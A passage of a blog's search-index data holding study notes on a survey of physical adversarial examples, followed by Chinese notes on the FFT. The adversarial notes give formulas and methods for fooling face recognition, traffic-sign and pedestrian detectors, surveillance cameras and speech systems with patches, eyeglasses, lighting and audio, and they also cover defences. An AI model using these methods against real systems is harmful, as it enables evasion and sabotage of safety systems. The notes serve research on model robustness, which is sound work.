Attack","uri":"/pae-attack/"},{"categories":[],"content":"overview The digital world and physical world, divide the adversarial examples into digital kinds and physical kinds. ","date":"2024-07-27","objectID":"/pae-attack/:5:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Key Particularities among PAEs What makes the PAEs different from the digital ones are the particular generation processes. manufacture the digitally-trained adversarial patterns into the physical environment of existing objects, which indicates a “virtual-to-real” process. Key: manufacture technique manufacture carrier sampling environment sampler quality basic attributes core attributes epitaxial attributes ","date":"2024-07-27","objectID":"/pae-attack/:6:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Definition of PAEs adversarial examples $$ y^x \\ne \\mathcal{F}(x_{adv}^{d}),x_{adv}^{d}=x + \\delta $$ where $y^x$ is the ground-truth label of the input instance $x,\\delta$ indicates the adversarial perturbation, and it satisfes $|\\delta|\u003c\\varepsilon$ (ε is a small enough radius and bigger than 0). Things changed in physical world. modified definition into physical world $$ y^x\\neq\\mathcal{F}(x_{adv}^p),\\quad s.t.,\\quad \\Vert x_{adv}^p\\Vert _ \\aleph\u003c\\varepsilon, \\\\ x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta),c), $$ $x_{adv}^p$ physical adversarial example $\\mathcal{R}(\\cdot)$ re-sampling function that represents the re-sampling process $\\mathcal{M}(\\cdot)$ manufacturing function that represents the manufacturing process $c$ a certain environment condition and comes from the real and infinite environment conditions that are denoted as $\\mathbb{E},i.e.$, $c\\in\\mathbb{E}$ the $|\\cdot|_\\aleph$ represents the evaluation metric that measures the naturalness of the PAE that input to the deployed artificial intelligence system $\\aleph$ indicates the recognizable space of human beings to the PAEs. where $x_{adv}^p$ is the input physical adversarial example to the deployed deep models, $\\mathcal{R}(\\cdot)$ is the re-sampling function that represents the re-sampling process, $\\mathcal{M}(\\cdot)$ is the manufacturing function that represents the manufacturing process, $c$ is a certain environment condition and comes from the real and infinite environment conditions that are denoted as $\\mathbb{E},i.e.$, $c\\in\\mathbb{E}$, the $|\\cdot|_\\aleph$ represents the evaluation metric that measures the naturalness of the PAE that input to the deployed artificial intelligence system, $\\aleph$ indicates the recognizable space of human beings to the PAEs. To be brief, the $\\aleph$ constraint imposed on the $\\delta$ correlates to the **“suspicious” **extent of PAEs. More precisely, a very perceptible adversarial perturbation is not accepted in real scenarios. Section III .Classify PAEs manufacturing process-oriented ones re-sampling process-oriented ones others ( aim at naturalness, transferability ) ","date":"2024-07-27","objectID":"/pae-attack/:7:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Manufacturing Process Oriented PAEs principles： material-driven task-driven Our categories touchable attacks untouchable attacks where the former indicates that the generated adversarial examples could be touched by hands and the latter could not. ","date":"2024-07-27","objectID":"/pae-attack/:8:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Touchable Attacks: 2D attacks [22] M. Sharif, S. Bhagavatula, L. Bauer, and M. K. Reiter, “Accessorize to a crime: Real and stealthy attacks on state-of-the-art face recognition,” in Proceedings of the 2016 acm sigsac conference on computer and communications security, pp. 1528–1540, 2016. smoothness and practicability Optimize process Total Variation Loss (using total-variation norm) $$ L_{tv}=\\sum_{i,j}\\sqrt{\\left(p_{i+1,j}-p_{i,j}\\right)^2+\\left(p_{i,j+1}-p_{i,j}\\right)^2}. $$ Loss function $L_{tv}$ . practicability Non-Printability Score Loss function $NPS(\\hat{p})$ . $$ NPS(\\hat{p})=\\prod_{p\\in P}|\\hat{p}-p|. $$ The form of this PAEs is kind of simple. [23] J. Lu, H. Sibai, and E. Fabry, “Adversarial examples that fool detectors,” arXiv preprint arXiv:1712.02494, 2017. demonstrated a minimization procedure to create adversarial examples that fool Faster RCNN in stop sign and face detection tasks. However, due to the restrictive environmental conditions, this adversarial attack did not perform well in the physical world [24] A. Kurakin, I. J. Goodfellow, and S. Bengio, “Adversarial examples in the physical world,” in 5th International Conference on Learning Representations, pp. 24–26, 2017. demonstrated the possibility of crafting adversarial examples in the physical world by simply manufacturing printout adversarial examples, re-sampling them by a cellphone camera, and then feeding them into an image classification model. [4] K. Eykholt, I. Evtimov, E. Fernandes, B. Li, A. Rahmati, C. Xiao, A. Prakash, T. Kohno, and D. Song, “Robust physical-world attacks on deep learning visual classification,” in Proceedings of the IEEE conference on computer vision and pattern recognition, pp. 1625–1634, 2018. first generated adversarial perturbations in the physical world against road sign classifiers and proposed the Robust Physical Perturbations (RP2) algorithm. By optimizing and manufacturing white-black bock perturbation, the authors successfully attacked the traffic sign recognition model. Robust Physical Perturbations (RP2) algorithm. [30] D. Song, K. Eykholt, I. Evtimov, E. Fernandes, B. Li, A. Rahmati, F. Tram`er, A. Prakash, and T. Kohno, “Physical adversarial examples for object detectors,” in 12th USENIX Workshop on Offensive Technologies (WOOT 18), (Baltimore, MD), USENIX Association, Aug. 2018. extended the RP2 algorithm to object detection tasks and manufactured colorful adversarial stop sign posters. [25] M. Lee and Z. Kolter, “On physical adversarial patches for object detection,” arXiv preprint arXiv:1906.11897, 2019. first proposed an adversarial patch-attacking method that could successfully attack detectors without having to overlap the target objects [26] S. Thys, W. V. Ranst, and T. Goedeme´, “Fooling automated surveillance cameras: Adversarial patches to attack person detection,” in 2019 IEEE/CVF Conference on Computer Vision and Pattern Recognition Workshops (CVPRW), pp. 49–55, 2019. first generated physical adversarial patches against pedestrian detectors by optimizing a combination of adversarial objectness loss, TV loss, and NPS loss. Robust Physical Perturbations (RP2) algorithm. New Framework previous modify adversarial examples in the perturbation process to meet additional objectives This framework proposed a general framework to generate diverse adversarial examples. The authors utilized GANs and constructed adversarial generative nets (AGNs), which are flexible to accommodate various objectives, e.g., inconsciousness, robustness, and scalability. [31] T. Malzbender, D. Gelb, and H. Wolters, “Polynomial texture maps,” in Proceedings of the 28th annual conference on Computer graphics and interactive techniques, pp. 519–528, 2001. The authors leveraged the Polynomial Texture Maps approach [31] to get eyeglasses’ RGB values under specific luminance. By using this framework, the authors constructed adversarial eyeglasses and fooled classifiers for face recognition. SNPS [32] D. Wang, C. Li, S. Wen, Q.-L. Ha","date":"2024-07-27","objectID":"/pae-attack/:8:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Untouchable attack The untouchable attacks consist of lighting attacks and audio/speech attacks. Lighting attack placing a spactial light , e. g. programmable LED spatial light modulator, such as SLM in front of the photographic modify human non-sensitive optical parameters add easily overlooked shadow, projection in special shape All optimized. The perturbation generation process can be formulated as follows within the context of $\\mathcal{T}$ modeling environment conditions $\\mathbb{E}$, which also correlates to $\\mathcal{R}(\\cdot)$ mentioned previously, during the re-sampling process. Let $I_{amb}$ represent the image captured under ambient light conditions, $I_{sig}$ denote the image taken under the influence of fully illuminated attacker-controlled lighting, and $g(y+\\delta)$ indicate the average impact of the signal on row $y{:}$ $$ x_{adv}^p=\\mathcal{T}(I_{amb})+\\mathcal{T}(I_{sig})\\cdot g(y+\\delta). $$ Audio/Speech attacks Speech recognition is a task to transcribe the audio/speech into text, which is then used to control the system, such as the audio assistant in mobile phones and automatic driving. Currently, some researchers develop over-the-air attacks against the deployed speech recognition system by playing the audio, impulse, and so on. To solve the instability issues during back-propagation in the frequency domain, the author used the Discrete Fourier Transform (DFT), allowing them can perform attacks in the time domain as the symmetry properties of the DFT after the perceptual measures are extracted from the original audio. The loss function of the manufacturing process can be summarized as: $$ \\mathcal{L}(x,\\delta,y)=\\mathbb{E_{t\\in\\mathcal{T}}}[\\mathcal{L_{net}}(f(t(x+\\delta)),y)+\\alpha\\cdot\\mathcal{L_{\\theta}}(x,\\delta)] $$ where the former term and the latter term refer to the robustness loss and imperceptibility loss, respectively. Voice assistants, Karplus-Strong algorithm voice-controllable device DNN-based speaker recognition system …… ","date":"2024-07-27","objectID":"/pae-attack/:8:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The re-sampling process-oriented ones Shift from digital to physical with loss. After finishing manufacturing, the physical adversarial examples will take effect by being re-sampled and input into the deployed deep models in real artificial systems. And during this process, some of the key information correlated to the adversarial characteristics inside the PAEs might be affected and cause certain attacking ability degeneration due to the imperfect re-sampling, which could be also called physical-digital domain shifts. More precisely, this kind of physical-digital shift consists of 2 types as shown in Figure 9, i.e., the environment-caused and sampler-caused, therefore motivating us to categorize the re-sampling process-oriented PAEs into environment-oriented attacks and sampler-oriented attacks. ","date":"2024-07-27","objectID":"/pae-attack/:9:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Environment-oriented Attacks Interference by natural factors: environmental lights (CV) environmental noises (ASR) …… The physical attack performance is significantly impacted by environmental factors, such as light and weather, which motivates the researcher to take these factors into account during the optimization of PAEs. Du et.al. [75] proposed the physical adversarial attack for aerial imagery object detector, avoiding remote sensing reconnaissance. They design the tools for simulating re-sampling differences caused by atmospheric factors, including lightning, weather, and seasons. Finally, they optimize the adversarial patch by minimizing the following loss function: $$ \\mathcal{L}=\\mathbb{E_{t\\in\\mathcal{T}}}[\\max(\\mathcal{F}^b(t(x_{adv}^d)))]+\\lambda_1\\mathcal{L_{nps}}(\\delta)+\\lambda_2\\mathcal{L_{tv}}(\\delta) $$ where the first term is the adversarial loss to suppress the maximum prediction objectness score over the transformation distribution T , the second term ensures the optimized color is printable, and the last term is used to ensure the naturalness of the adversarial patch. $$ \\min \\mathcal{L} $$ Import DTN brightness, contrast, color shadow Thus, the author devised a differentiable transformation network (DTN) to learn potential physical transformations (e.g., shadow). Once DTN is trained, the author optimizes the robust adversarial texture for the vehicle via DTN. With light attack As we mentioned above, the adversarial LED light attack [49] also concerns the environment inside the attacking scenario. During the perturbation generation process, they propose the function T , which can be regarded as the R(·) in our definition, to model environment conditions (including viewpoint and lighting changes). In this way, they take the environmental variation during re-sampling into account to preserve the attacking ability and cross the digital-physical domain. For physical characteristics of voice To alleviate the potential distortion caused by the environment, a line of works [16], [63], [66], [68], [69] has adopted the room impulse response (RIP) to mimic distortion caused by the process of the speech being played and recorded, which can be expressed as: $$ x_{adv}^d(t):r(t)=y_{adv}^p(t)*x_{adv}^d(-t), $$ where the $x_{adv}^d(t)$ is the audio clip, and the $y_{adv}^p(t)$ is the corresponding estimated recorded audio clip, * denotes the convolution operation. Then, RIP $r(t)$ incorporates the generation of $\\delta$ by a transform $T(x)=x*r$, which reduces the impact of distortion brought by hardware and physical signal patch, significantly improving speech physical attack robustness. ","date":"2024-07-27","objectID":"/pae-attack/:9:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Sampler-oriented Attacks Sampler waste adversarial information. The case in point is sampling angles in computer vision tasks, when taking photos from different perspectives, the sampled instances might show slight differences in shape and color, e.g., affine transformation-like difference, and overexpose. To confront the view perspective change in the physical world, Athalye et.al. [37] formulated the potential physical transformations (e.g., rotation, scale, resize) as a uniform formal that is the expectation over transformation (EOT), which is mathematically denoted as follows. $$ \\delta=\\mathbb{E_{t\\thicksim\\mathcal{T}}}[d(t(x_{adv}^d),t(x))]. $$ The above formula is designed to alleviate the data domain gap caused by transformation, enhancing the robustness of the adversarial texture. Useful tools function imported To keep imperceptible, adversarial after the transformation. Specifically, they utilized the mask to constrain the perturbation to be located in the traffic sign area, and the position of the perturbation is optimized by imposing the L1 norm. The above optimization can be expressed as: $$ \\arg \\min_\\delta \\lambda \\Vert \\delta\\Vert_p+\\mathcal{L_{nps}}(\\delta)+\\mathbb{E_{x\\sim X^V}} \\mathcal{L} (\\mathcal{F}(x+t(\\delta)),y), $$ where the first term is used to bound the norm of δ for the patch’s imperceptible, the third term takes into account the transformation inside in x and applies the same transformation on δ and the $X^V$ includes the digital and physical collected training dataset. To mimic the perspective changing in the physical world as possible The adversarial UV is wrapped over the vehicle by changing the camera position and rendered into multi-view images. Thus, the adversarial UV texture is trained to optimize the following object function $$ \\arg\\min_\\delta\\mathbb{E_{x\\sim X,e\\sim\\mathbf{E}}}[\\frac1n\\sum_{p_i\\in P}\\mathcal{L}(\\mathcal{F}(x_{adv}^d,p_i),y)], $$ where E denotes the environment condition determined by the physical render, such as different viewpoints and distances; P indicates the output proposals of each image respective to the two-stage detector (e.g., Faster RCNN). Adversarial viewpoints Recently, Dong et.al. [87] demonstrated that there exist adversarial viewpoints, where images captured under such viewpoints are hard to recognize for DNN models. They leveraged the Neural Radiance Fields (NeRF) technique to find the adversarial viewpoints. Specifically, they find the adversarial viewpoints by solving the following problem $$ \\max_{p(v)} \\set{ \\mathbb{E_{p(v)}}[\\mathcal{L}(\\mathcal{F}(\\mathcal{G}(v)),y)]+\\lambda\\cdot\\mathcal{H}(p(v)) } $$ where $p(v)$ denotes the adversarial viewpoints distribution $\\mathcal{G}(v)$ is the render function of NeRF, which renders an image with the input viewpoints; $\\mathcal{H}(p(v))=\\mathbb{E_{p(v)}}[-\\log(p(v))]$ is the entropy of the distribution of $p(v).$ To alleviate the influence of deformable. Xu et.al. [14] took the Think Plate Spline (TPS) [88] method into account when optimizing the wearable adversarial patch to model the topological transformation from texture to cloth caused by body movement. Specifically, they construct the adversarial examples as following $$ x_{adv}^d=t_{env}(A+t(B-C+t_{color}(M_{c,i}\\circ t_{TPS}(\\delta+\\mu v))), $$ where $t_{env}\\in\\mathcal{T}$ indicates the environmental brightness transform, $t_{color}$ is a regression model that learns the color covert between the digital image and its printed counterpart, $t_{TPS}$ denotes the TPS transform; $A$ is the background region expect the person, B is the person-bounded region, and C is the cloth region of the person, $v\\in\\mathcal{N}(0,1)$ to improve the diversity of perturbation. ","date":"2024-07-27","objectID":"/pae-attack/:9:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Other PAE Topics ","date":"2024-07-27","objectID":"/pae-attack/:10:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Natural Physical Adversarial Attacks Physical adversarial attacks often prioritize achieving high performance by ignoring the extent of modifications made to adversarial patches or camouflages. However, noticeable alterations can alert potential victims, leading to the failure of the attack. To address this, research has concentrated on creating subtle perturbations that can be deployed in real-world scenarios without detection, enabling natural physical adversarial attacks. The primary techniques employed in this area are divided into two categories: Optimization-based Methods: These methods focus on refining individual adversarial examples to ensure that they are imperceptible while still effective in attacking the target model. Generative Model-based Methods: In contrast to optimization-based methods, these approaches operate within the latent space of generative models that are trained on data. They leverage the learned distribution to generate adversarial examples that are both effective and difficult to detect. The goal of this research is to develop adversarial attacks that maintain a natural appearance, increasing their stealthiness and likelihood of success when deployed against real-world systems. Optimized-based methods Introduce another metric function. Initially, researchers attempted to make adversarial patches look like a particular benign patch to expose the security problems of deep learning models. A classical method applies the total-variation optimization objective mentioned in the previous sections, which improves the naturalness of the adversarial example in addition to improving the printability Duan $et.al.$ propose AdvCam [91] that minimizes $\\mathcal{L_s}$, $\\mathcal{L_c}$ , $\\mathcal{L_{tv}}$ . The naturalness loss can be formalized as: $$ \\mathcal{L_{\\text{nature}}}=\\mathcal{L_s}+\\mathcal{L_c}+\\mathcal{L_{tv}}. $$ the style distance $\\mathcal{L_s}$ between the patch and the referenced image the content distance $\\mathcal{L_c}$ between the patch and the background maximizes the smoothness loss defined by the total-variation loss $\\mathcal{L_{tv}}$ Generative model-based methods In general, the generative method can be formulated as: $$ \\mathcal{L_{natural}}=\\mathbb{E_{x\\sim P_{real},y\\sim P_{adv}}}(\\mathcal{D}(x,y)), $$ where $x\\sim P_{real}$ are real data sampled from the training dataset, $P_{adv}$ is the distribution generated by the attack model $G_{\\theta}(P_{real})$, and $\\mathcal{D}(\\cdot,\\cdot)$ is the pre-defined (in VAE models) or adversarially learned (in GAN models) distance metric Specifically, $\\tilde{\\mathcal{D} } ( x, y) = - \\log ( D_\\theta ( x) ) - \\log ( 1- D_\\theta ( y) )$ in the vanilla GAN, where $D_\\theta(\\cdot)$ is the adversarially trained discriminator network. ","date":"2024-07-27","objectID":"/pae-attack/:10:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Transferable Physical Adversarial Attacks - transferability The transferability of PAE measures whether the adversarial examples are highly aggressive across models. Previous work on adversarial attacks in the digital world has shown that the same adversarial sample can exhibit generic attack capabilities for different deep learning models [101]. Formally, referring to Eq.(1), for the generator $\\delta (x)$ trained to maximize $\\mathcal{D}(y^x,\\mathcal{F_{1}}(x_{adv}^p)),s.t.\\Vert x_{adv}^p\\Vert _{\\aleph} \\lt \\varepsilon$, the scenario of transferable physical adversarial attacks requires that the adversarial example $\\delta(x)$ be evaluated and tested on other models: $$ \\mathcal{D}(y^x,\\mathcal{F_2}(x_{adv}^p)),\\quad x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta(x)),c), $$ where $\\mathcal{F_1}$ and $\\mathcal{F_2}$ are different models. ","date":"2024-07-27","objectID":"/pae-attack/:10:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Generalized Physical Adversarial Attacks - robustness The generalization ability of physical adversarial attacks, is another key to studying the limitation of the deep learning models in the real world In general, the generalization ability over different target objects and different transformations are two important generalization problems to consider. Formally, referring to Eq. (1), for the generator $\\delta(x)$ trained to maximize $\\mathcal{D}(y^x,\\mathcal{F}(x_{adv}^p))$, s. t. $|x_{adv}^p|_\\aleph\u003c\\varepsilon $ $$ x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta(x)),c), x\\sim P_x(x), c\\sim P_c(c). $$ The scenario of generalized physical adversarial attacks requires that the adversarial example $\\delta(x)$ be evaluated in other data set and environment conditions, and tested in the condition of: $$ x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta(x)),c), x\\sim P_x^{\\prime}(x), c\\sim P_c^{\\prime}(c), $$ where $P_x$ and $P_x^{\\prime}$ are different data distributions, and $P_c$ and $P_c^{\\prime}$ are different environmental condition distributions. SECTION IV . CONFRONT PHYSICAL ADVERSARIAL EXAMPLES Threats makes necessity to protect intelligent applications. Mainstream strategies data-end defenses model-end defenses ","date":"2024-07-27","objectID":"/pae-attack/:10:3","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Defend against PAEs We still take the three processes of PAEs as the starting point for thinking, considering the two standards of the data side and the model side, and considering possible defense means in various directions. ","date":"2024-07-27","objectID":"/pae-attack/:11:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Data-end Defense Strategies The data-end defense strategies aim to reduce the influence of adversarial perturbations, thus the sampled adversarial examples would be not allowed to mislead the deep models in deployed systems. ","date":"2024-07-27","objectID":"/pae-attack/:11:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":" The adversarial detecting Determining whether the input instances are adversarial. So just reject the input and evade the attack in turn. Idea is usually simple, and the practice often has different strategies. Summary of Adversarial Detection Methods SentiNet (Chou et.al.) Detects universal adversarial patches. No model modifications required. Practical for real-world scenarios. Ad-YOLO (Ji et.al.) Utilizes YOLO architecture with an added “patch” class label. Effective in detecting adversarial patches compared to standard YOLO. TaintRadar (Li et.al.) Detects localized adversarial examples by identifying regions causing significant label variance. Demonstrates effectiveness in digital and physical environments. Segmentation Approach (Liu et.al.) Trains a patch segmentor and performs shape completion to detect and remove adversarial patches from images. Patch-Feature Energy-Driven Method Removes deep characteristics of adversarial patches to protect detection models. Patch Zero Detects and nullifies adversarial patches to mitigate their influence. Each method addresses different aspects of detecting and mitigating adversarial attacks in machine learning models. The adversarial denoising This kind of defense method prevents models from being fooled by adversarial attacks at the instance level, i.e., straightly removing the injected perturbation or noises inside the adversarial examples. This kind of defense could also combine with the aforementioned adversarial detecting strategy, leading to better defending ability. A series of results from this idea: Summary of Adversarial Defense Methods Instance-Level Defense Goal: Prevent models from being fooled by removing perturbations or noises within adversarial examples. Combination: Can be combined with adversarial detection strategies for enhanced defense. Local Gradient Smoothing (LGS) (Nasser et.al.) Targets physical attacks like Localized and Visible Adversarial Noise (LaVAN) and adversarial patches. Estimates regions with high probability of adversarial noise. Reduces gradient activity in these regions to correctly recognize adversarial examples. Occlusion Method (McCoyd et.al.) Mitigates influence from adversarial patches by partially occluding the image around candidate patch locations. Considered a form of denoising by destroying adversarial patches through occlusion. Adversarial Pixel Masking (APM) Defends against physical attacks, such as adversarial patches. Trains an adversarial pixel mask module to remove patches based on the generated mask. Patch Zero Functions as a denoising strategy. Combines adversarial detection and denoising to tackle adversarial attacks. These methods enhance the robustness of models by either directly removing adversarial perturbations or by combining detection and denoising techniques. The adversarial prompting Add information to offset the negative impact of adversarial perturbations, prompt what labels the models should truly predict via positive injections. Summary of Adversarial Prompting Defense Methods Adversarial Prompting Goal: Achieve defense by adding information to counteract the negative impacts of adversarial perturbations, prompting models towards correct predictions with positive injections. Unadversarial Examples (Salman et.al.) [118] Generates textures with prompting ability in a 3D environment. Creates “robust objects” based on deep models' input-perturbation-sensitivity. Provides a new approach for physical adversarial defenses. Preemptive Robustification (Moon et.al.) [119] Defends against intercept-and-perturb behaviors in real scenarios. Utilizes a bi-level optimization scheme to discover robust perturbations that can be added to images. Defensive Patch (Wang et.al.) [120] Pre-injects positive patches into instances to aid image recognition. Enhances prompting intensity with strong global perceptual correlations and local identifiable patterns. Effective against both adversarial patches and common corruptions. Amicable Aid","date":"2024-07-27","objectID":"/pae-attack/:11:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Model-end Defense Strategies Adversarial training Model modification Certified robustness ","date":"2024-07-27","objectID":"/pae-attack/:11:3","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Challenges of PAEs ","date":"2024-07-27","objectID":"/pae-attack/:12:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Generating Transferable PAEs ","date":"2024-07-27","objectID":"/pae-attack/:12:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Generating Generalizable PAEs ","date":"2024-07-27","objectID":"/pae-attack/:12:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Opportunities of PAEs ","date":"2024-07-27","objectID":"/pae-attack/:13:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Evaluate the Application Robustness via PAEs ","date":"2024-07-27","objectID":"/pae-attack/:13:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Protect the Application Privacy via PAEs Section V .CONCLUSION","date":"2024-07-27","objectID":"/pae-attack/:13:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"从拉格朗日插值法到 FFT. Part-1. It was listed by the Science magazine as one of the ten greatest algorithms in the 20th century 从 FT 开始加速多项式乘法。主要记录了笔者学习傅里叶变换这一特殊线性变换时的笔记。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:0:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Fourier Transform 傅里叶变换（Fourier Transform）是一种分析信号的方法，它可分析信号的成分，也可用这些成分合成信号。许多波形可作为信号的成分，傅里叶变换用正弦波作为信号的成分。 对于时序逻辑可以写作关于时间 $t$ 的函数 $f(t)$ , 傅里叶变换可以检测频率 $\\omega$ 的周期在 $f(t)$ 出现的程度。 $$ F(\\omega)=\\mathbb{F}[f(t)]=\\int_{-\\infty}^\\infty f(t)\\mathrm{e}^{-\\mathrm{i}\\omega t}dt $$ 其作用也可以表示为：时域映射到频域 $$ \\hat{f} \\left ( \\xi \\right ) = \\int _{- \\infty }^{\\infty }f( x) e^{- 2\\pi ix\\xi }dx $$ $\\xi$为任意实数 很多时候，这里的 $\\hat{f}\\left(\\xi\\right)$ 会写成 $F(w)$ 或 $F(f)$ 表示角速度或者频率，当然后面的公式的量纲也需要对应的修改；后面的自变量 $x$ 大多数时候都是写成 $t$ 表示时间。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:1:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Discrete Fourier Transform DFT, 离散傅里叶变换。DFT 在工程中是将离散信号从时域转为频域的过程。其表达式可以用于多项式求值，点值固定设计为单位根。 DFT 将一个长度为 $N$ 的复数序列 $x_0,x_1,\\dots,x_{N-1}$ 通过如下公式转化为另一等长度复数序列$X_0,X_1,\\dots,X_{N-1}$: $$ X_k = \\sum_{n=0}^{N-1} x_n e^{-\\frac{2\\pi i}{N}kn} \\tag1 $$ 结合单位根 (root of unit) 的概念可得 $$ X_k=\\sum_{n=0}^{N-1}x_n\\omega_N^{-kn} \\tag2 $$ 那么，对于已知目标多项式 (系数向量为待变换序列) $$ f(x)=\\sum_{n=0}^{N-1}x_nx^i\\tag3 $$ 代入得 $$ X_k=\\sum_{n=0}^{N-1} x_n (\\omega_N^{-k})^n=f(\\omega_N^{-k}) $$ 说明，所构造多项式 $(3)$ 进行在单位根处求值，即可完成一次离散傅里叶变换。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:2:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Fast Fourier Transform 快速傅里叶变换 用于加速多项式乘法。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:3:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Core idea. 我们的问题是，如何用更小的开销实现多项式求值。 不难证明，对于任意一多项式 $f(x)$ ，可分解为奇函数 $f_o(x)$ 和 偶函数 $f_e(x)$ 之和。则： $$ \\begin{cases} f(x) \u0026= f_e(x) + f_o(x) \\\\ f(-x) \u0026= f_e (x) - f_o(x) \\end{cases} $$ 注意到 $f_e(x),f_o(x)$ 项数均为 $f(x)$ 的一半，且 $f_o(x) = xf^{\\prime}_e(x)$. 又由换元思想，可将元函数二分处理。 即： $$ f(x)=(a_0+a_2x^2+a_4x^4+\\cdots+a_{n-2}x^{n-2})+(a_1x+a_3x^3+a_5x^5+\\cdots+a_{n-1}x^{n-1}) $$ 令 $$ \\begin{cases}f_e(x)=a_0+a_2x+a_4x^2+\\cdots+a_{n-2}x^{\\frac n2-1} \\\\ f_o(x)=a_1+a_3x+a_5x^2+\\cdots+a_{n-1}x^{\\frac n2-1} \\end{cases} $$ 则有 $$ f(x)=f_e(x^2)+xf_o(x^2) $$ 假设$k\u003c\\frac n2$ , 现在要求$f(\\omega_n^k)$ $$ \\begin{aligned}f(\\omega_{n}^{k})\u0026=f_e(\\omega_n^2)+\\omega_n^k f_o(\\omega_n^{2k}) \\\\ \u0026=f_e(\\omega_{\\frac n2}^k)+\\omega_n^kf_o(\\omega_{\\frac n2}^k)\\end{aligned} $$ 这一步转化利用了单位根的性质。 考虑 $f(\\omega_n^{k+\\frac{1}{2}n})$, 由循环群的性质不难计算： $$ f(\\omega_n^{k+\\frac{1}{2}n})=f_e(\\omega_{n/2}^k) - \\omega_n^k f_o(\\omega_{n/2}^k) $$ 令 $k$ 遍历 $[0,n/2 -1]$, 则 $k+n/2$ 遍历 $[0,n-1]$. 即，若已知 $f_e(x),f_o(x)$ 在 $\\omega$ 在 $\\omega_{\\frac n2}^0,\\omega_{\\frac n2}^1,\\ldots,\\omega_{\\frac n2}^{\\frac n2-1}$ 处的点值，就可以在 $O(n)$ 的时间内求得 $f(x)$ 在 $\\omega_n^0,\\omega_n^1,\\ldots,\\omega_n^{n-1}$ 处的取值。而关于 $f_e(x)$ 和 $f_o(x)$ 的问题都是相对于原问题规模缩小了一半的子问题，分治的边界为一个常数项$a_{0}$。 根据主定理，该分治算法的时间复杂度为 $$ T(n)=2T(\\frac{n}{2})+O(n)=O(n\\log n) $$ 最常用的 FFT 算法—— Cooley-Tukey 算法。 递归实现的 FFT 效率不高，实际中一般采用迭代实现。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:3:1","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Inverse Discrete Fourier Transform, IDFT 离散傅里叶逆变换 (Inverse Discrete Fourier Transform, IDFT) 可以视为单位根处插值的过程。即给出$n=2^w$个在所有$n$次单位根处的点值 $P_k=(\\omega_n^k,f(\\omega_n^k))(0\\leq k\u003cn)$, 要求还原$f$的各项系数，其中 $f$ 的次数不大于 $n-1$ 。 IDFT和IFFT 之间也存在一些类似差异。 根据前文所提，不难知道拉格朗日插值可以视作范德蒙方阵求逆过程。对于多项式 $f$ 经过 FFT 之后， 再进行 快速傅里叶变换， 仍得到 $f$. 那么对 FFT 的矩阵求逆，可以得到 IFFT 的变换矩阵。 $$ \\mathcal{F}=\\begin{bmatrix}(\\omega^0)^0\u0026(\\omega^0)^1\u0026\\cdots\u0026(\\omega^0)^{n-1} \\\\ (\\omega^1)^0\u0026(\\omega^1)^1\u0026\\cdots\u0026(\\omega^1)^{n-1} \\\\ \\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\ (\\omega^{n-1})^0\u0026(\\omega^{n-1})^1\u0026\\cdots\u0026(\\omega^{n-1})^{n-1}\\end{bmatrix} $$ 则 $(\\mathcal{F_{ij}}^{-1})= [x^i] \\prod_{k\\neq j} \\frac{x-\\omega^k}{\\omega^j-\\omega^k}$ . 进一步分析： $$ \\prod_{0 \\le k \\lt n} (x-\\omega^k) = x^n -1 $$ 考虑辅助函数 $$ \\begin{aligned} g(x) \u0026= \\frac{\\prod_{0 \\le k \\lt n} (x-\\omega^k)}{x - \\omega^j} \\\\ \u0026= \\sum_{0 \\le i \\le n-1} (\\omega^{j})^{i}x^{n-1-i} \\end{aligned} $$ 故 $$ \\begin{aligned} \\mathcal{F_{ij}}^{-1} \u0026= [x^i]\\prod_{k\\neq j}\\frac{x-\\omega^k}{\\omega^j-\\omega^k} \\\\ \u0026= \\frac{[x^i]g(x)}{g(\\omega^j)} \\\\ \u0026= 